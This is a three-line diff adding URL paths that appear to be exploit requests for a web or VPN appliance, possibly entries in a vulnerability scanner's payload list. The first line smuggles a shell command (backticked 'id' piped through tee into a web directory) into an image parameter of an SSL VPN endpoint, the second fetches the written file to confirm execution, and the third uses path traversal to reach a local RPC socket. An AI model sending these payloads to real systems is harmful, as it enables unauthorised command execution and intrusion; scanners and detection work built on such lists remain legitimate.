@@ -1,0 +1,3 @@
+/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/test
+/test
+/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc
